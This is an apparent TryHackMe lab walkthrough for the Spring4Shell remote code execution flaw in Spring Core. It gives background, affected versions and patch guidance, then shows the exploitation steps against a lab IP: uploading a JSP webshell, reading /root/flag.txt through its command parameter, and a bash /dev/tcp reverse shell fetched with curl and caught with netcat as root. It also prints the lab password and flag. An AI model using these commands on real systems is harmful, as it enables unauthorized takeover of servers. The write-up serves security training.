---
This room will provide an overview of the Spring4Shell RCE vulnerability in Spring Core, as well as give you an opportunity to exploit it for yourself in the vulnerable machine attached to this task.
---

> In short, the vulnerability allows attackers to upload a "webshell" (a piece of code which accepts commands from the attacker that the webserver is then tricked into executing) to the vulnerable server, achieving remote command execution

### How Does it Work?

> To understand Spring4Shell, it is important that we understand CVE-2010-1622. Spring MVC (Model-View-Controller) is part of the Spring Framework which makes it easy to develop web applications following the MVC design pattern. One of the features of Spring MVC is that it automatically instantiates and populates an object of a specified class when a request is made based on the parameters sent to the endpoint. In simple terms, this could be abused to overwrite important attributes of the parent class, resulting in remote code execution. 

`The majority of the exploits for the Spring4Shell vulnerability operate by forcing the application to write a malicious .jsp file (effectively plaintext Java which Tomcat can execute — much like a PHP webserver would execute files with a .php extension) to the webserver. This webshell can then be executed to gain remote command execution over the target.`

> The Spring4Shell vulnerability affects Spring Core before version 5.2, as well as in versions 5.3.0-17 and 5.2.0-19, running on a version of the Java Development Kit (JDK) greater than or equal to 9. 

*Current conditions for vulnerability (as stated in Spring's announcement of the vulnerability) can be summarised as follows:*

- JDK 9+
- A vulnerable version of the Spring Framework (<5.2 | 5.2.0-19 | 5.3.0-17)
- Apache Tomcat as a server for the Spring application, packaged as a WAR
- A dependency on the spring-webmvc and/or spring-webflux components of the Spring Framework

### Remediations

> Fortunately, patched versions of the Spring Framework have been released. To remediate Spring4Shell, ensure that you are using a version of Spring released after patch 18 of minor release 5.3 (i.e. after 5.3.18), or after patch 20 if using minor release 5.2 (i.e. after 5.2.20). 

```
http://10.10.196.13:8080/exploit.zip
```

```
unzip exploit.zip
```

==pass: TryHackMe123!==

> We can easily find our target URL by checking the source code of the website homepage (view-source:http://10.10.196.13/).
Specifically we are looking for the "action" of the contact form (the only POST request available to us). This is found on line 20:
form id="contactForm" action="/" method="post"
> The action is "/", meaning that our target URL will simply be: http://10.10.196.13/. Note: the trailing slash is very important here!

```
./exploit.py http://10.10.196.13/
```

> Shell Uploaded Successfully!
   Your shell can be found at: http://10.10.196.13/tomcatwar.jsp?pwd=thm&cmd=whoami

### option 1

```
http://10.10.196.13/tomcatwar.jsp?pwd=thm&cmd=cat%20/root/flag.txt
```

`THM{NjAyNzkyMjU0MzA1ZWMwZDdiM2E5YzFm} `

### option 2 (reverse/bind shell)

```
nano reverse.sh
```

```
#!/bin/bash
bash -i >& /dev/tcp/<VPN IP>/4444 0>&1
```

```
chmod 777 reverse.sh
```

```
python3 -m http.server 80 
```

*in web after cmd*

```web
 curl%20VPN IP/reverse.sh -o /dev/shm/reverse.sh 
```
- %20 means space
- like curl 10.10.10.10/reverse.sh -o /dev/shm/reverse.sh

### netcat (kali machine)

```
rlwrap nc -nlvp 4444 
```

*in web after cmd*

```
bash /dev/shm/reverse.sh
```

> ┌──(kali㉿kali)-[~/Downloads/Spring4shell]
└─$ rlwrap nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.196.13] 39178
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
whoami
whoami
root
cd /root
ls
ls
flag.txt
cat flag.txt
cat flag.txt
THM{NjAyNzkyMjU0MzA1ZWMwZDdiM2E5YzFm}








